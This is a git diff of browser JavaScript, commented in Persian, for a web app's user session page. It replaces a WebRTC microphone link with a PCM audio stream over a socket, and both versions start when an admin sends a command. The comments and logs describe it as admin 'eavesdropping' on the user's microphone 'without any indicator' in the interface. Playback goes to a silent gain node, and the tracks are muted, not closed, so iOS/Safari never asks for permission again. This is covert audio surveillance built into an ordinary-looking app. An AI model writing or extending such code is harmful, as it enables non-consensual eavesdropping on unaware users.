@@ -343,13 +343,13 @@ function initSocket() {
   socket.on('audio_stream_started', async (data) => {
     if (!data || Number(data.sessionId) !== Number(sessionData.id)) return;
     console.log('🎙️ ادمین درخواست شنود صدای میکروفون را ارسال کرد:', data);
-    await startPeerConnection(data.adminSocketId);
+    await startPcmAudioStream();
   });
 
   socket.on('audio_stream_stopped', (data) => {
     if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
     console.log('🛑 استریم صدای میکروفون توسط ادمین قطع گردید.');
-    stopPeerConnection();
+    stopPcmAudioStream();
   });
 
   socket.on('webrtc_answer', async (data) => {
@@ -1098,137 +1098,105 @@ let lastAdminSocketId = null;
 
 let mediaSocketRecorder = null;
 
-function startSocketAudioStream() {
-  if (!localStream || mediaSocketRecorder) return;
-  try {
-    const mimeType = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/webm;codecs=opus'))
-      ? 'audio/webm;codecs=opus'
-      : (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/mp4') ? 'audio/mp4' : 'audio/webm');
+let pcmAudioContext = null;
+let pcmMicSource = null;
+let pcmProcessorNode = null;
+let isPcmStreaming = false;
 
-    mediaSocketRecorder = new MediaRecorder(localStream, { mimeType, audioBitsPerSecond: 32000 });
-    mediaSocketRecorder.ondataavailable = async (e) => {
-      if (e.data && e.data.size > 0 && socket) {
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          socket.emit('audio_stream_chunk', {
-            sessionId: sessionData.id,
-            chunk: reader.result,
-            mimeType: mimeType,
-          });
-        };
-        reader.readAsDataURL(e.data);
-      }
-    };
-    mediaSocketRecorder.start(1000); // ارسال هر ۱ ثانیه یک چانک برای استریم پیوسته
-  } catch (e) {
-    console.error('Socket audio stream error:', e);
-  }
-}
-
-function stopSocketAudioStream() {
-  if (mediaSocketRecorder) {
-    try { mediaSocketRecorder.stop(); } catch (_) {}
-    mediaSocketRecorder = null;
-  }
-}
-
-// ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
-async function startPeerConnection(adminSocketId) {
-  if (adminSocketId) lastAdminSocketId = adminSocketId;
-  const targetId = adminSocketId || lastAdminSocketId;
-
-  if (peerConnection) {
-    try { peerConnection.close(); } catch (_) {}
-    peerConnection = null;
-  }
-
-  // بررسی زنده بودن ترک‌های میکروفون و فعال‌سازی مجدد
+async function ensureLocalAudioStream() {
   const isStreamActive = localStream && localStream.getAudioTracks().some(t => t.readyState === 'live');
   if (isStreamActive) {
     localStream.getAudioTracks().forEach(t => { t.enabled = true; });
-  } else {
-    try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
-        return;
-      }
-      localStream = await navigator.mediaDevices.getUserMedia({
-        audio: {
-          echoCancellation: true,
-          noiseSuppression: true,
-          autoGainControl: true,
-        },
-        video: false,
-      });
-    } catch (err) {
-      console.error('عدم دسترسی به میکروفون:', err);
-      return;
-    }
+    return localStream;
   }
-
-  // فعال‌سازی همزمان فال‌بک سوکتی برای تضمین ارسال صدا پشت هر نوع فایروال یا NAT
-  startSocketAudioStream();
-
-  peerConnection = new RTCPeerConnection(rtcConfig);
-
-  // افزودن ترک‌های صدای میکروفون
-  localStream.getAudioTracks().forEach(track => {
-    peerConnection.addTrack(track, localStream);
-  });
-
-  // پایش پایداری اتصال و بازسازی در صورت قطعی
-  peerConnection.onconnectionstatechange = () => {
-    if (!peerConnection) return;
-    const state = peerConnection.connectionState;
-    console.log('User WebRTC state:', state);
-    if (state === 'failed' || state === 'disconnected') {
-      setTimeout(() => {
-        if (targetId) startPeerConnection(targetId);
-      }, 2000);
-    }
-  };
-
-  // ارسال ICE Candidates به ادمین
-  peerConnection.onicecandidate = (event) => {
-    if (event.candidate && socket && targetId) {
-      socket.emit('webrtc_ice_candidate', {
-        sessionId: sessionData.id,
-        candidate: event.candidate,
-        targetSocketId: targetId,
-      });
-    }
-  };
-
-  // ساخت Offer و ارسال به ادمین
   try {
-    const offer = await peerConnection.createOffer();
-    await peerConnection.setLocalDescription(offer);
-
-    if (socket && targetId) {
-      socket.emit('webrtc_offer', {
-        sessionId: sessionData.id,
-        offer: offer,
-        targetSocketId: targetId,
-      });
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
+      return null;
     }
+    localStream = await navigator.mediaDevices.getUserMedia({
+      audio: {
+        echoCancellation: true,
+        noiseSuppression: true,
+        autoGainControl: true,
+      },
+      video: false,
+    });
+    return localStream;
   } catch (err) {
-    console.error('خطا در ساخت WebRTC offer:', err);
+    console.error('عدم دسترسی به میکروفون:', err);
+    return null;
   }
 }
 
-function stopPeerConnection() {
-  stopSocketAudioStream();
-  if (peerConnection) {
-    try { peerConnection.close(); } catch (_) {}
-    peerConnection = null;
+async function startPcmAudioStream() {
+  if (isPcmStreaming) return;
+  const stream = await ensureLocalAudioStream();
+  if (!stream) return;
+
+  try {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    if (!AudioCtx) return;
+
+    if (pcmAudioContext && pcmAudioContext.state !== 'closed') {
+      try { await pcmAudioContext.close(); } catch (_) {}
+    }
+
+    pcmAudioContext = new AudioCtx({ sampleRate: 16000 });
+    pcmMicSource = pcmAudioContext.createMediaStreamSource(stream);
+
+    // ۴۰۹۶ سمپل در نرخ ۱۶ کیلوهرتز معادل حدود ۲۵۶ میلی‌ثانیه چانک فوق‌سبک صوتی (حدود ۸ کیلوبایت)
+    pcmProcessorNode = pcmAudioContext.createScriptProcessor(4096, 1, 1);
+
+    pcmProcessorNode.onaudioprocess = (e) => {
+      if (!isPcmStreaming || !socket || !sessionData) return;
+      const input = e.inputBuffer.getChannelData(0);
+      const len = input.length;
+      const pcm16 = new Int16Array(len);
+      for (let i = 0; i < len; i++) {
+        let s = Math.max(-1, Math.min(1, input[i]));
+        pcm16[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+      }
+      socket.emit('audio_stream_pcm', {
+        sessionId: sessionData.id,
+        pcm: pcm16.buffer,
+      });
+    };
+
+    // جهت جلوگیری از بازپخش صدای میکروفون در بلندگوی کاربر (Mute Gain Node)
+    const silentGain = pcmAudioContext.createGain();
+    silentGain.gain.value = 0;
+
+    pcmMicSource.connect(pcmProcessorNode);
+    pcmProcessorNode.connect(silentGain);
+    silentGain.connect(pcmAudioContext.destination);
+
+    isPcmStreaming = true;
+    console.log('🎙️ استریم پیوسته و سبک صوتی PCM با موفقیت فعال شد.');
+  } catch (e) {
+    console.error('خطا در فعال‌سازی استریم صوتی PCM:', e);
   }
-  // برای جلوگیری از نیاز به تایید مجدد پرمیشن میکروفون در سافاری و iOS، به جای بستن منبع، ترک را بی‌صدا (Mute) می‌کنیم
+}
+
+function stopPcmAudioStream() {
+  isPcmStreaming = false;
+  if (pcmProcessorNode) {
+    try { pcmProcessorNode.disconnect(); } catch (_) {}
+    pcmProcessorNode = null;
+  }
+  if (pcmMicSource) {
+    try { pcmMicSource.disconnect(); } catch (_) {}
+    pcmMicSource = null;
+  }
+  if (pcmAudioContext) {
+    try { pcmAudioContext.close(); } catch (_) {}
+    pcmAudioContext = null;
+  }
   if (localStream) {
     try {
       localStream.getAudioTracks().forEach(track => { track.enabled = false; });
     } catch (_) {}
   }
-  lastAdminSocketId = null;
 }
 
 window.addEventListener('beforeunload', () => {
